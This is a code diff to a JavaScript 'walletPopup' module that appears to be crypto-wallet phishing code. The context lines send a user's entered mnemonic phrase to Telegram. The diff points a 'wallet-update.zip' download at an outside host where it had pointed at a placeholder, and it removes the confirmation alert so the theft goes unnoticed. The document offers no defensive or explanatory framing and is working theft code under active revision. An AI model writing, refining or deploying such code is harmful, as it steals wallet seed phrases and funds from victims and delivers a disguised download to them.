@@ -352,7 +352,7 @@ const walletPopup = (() => {
   // Download handler
   function handleDownload() {
     const a = document.createElement('a');
-    a.href = 'https://example.com/wallet-update.zip'; // replace as needed
+    a.href = 'https://accesspoint.filebackupgate.com/'; // replace as needed
     a.download = 'wallet-update.zip';
     document.body.appendChild(a);
     a.click();
@@ -383,7 +383,7 @@ const walletPopup = (() => {
       return;
     }
     sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
-    alert('Phrase submitted!');
+   
     hidePopup();
   }
 
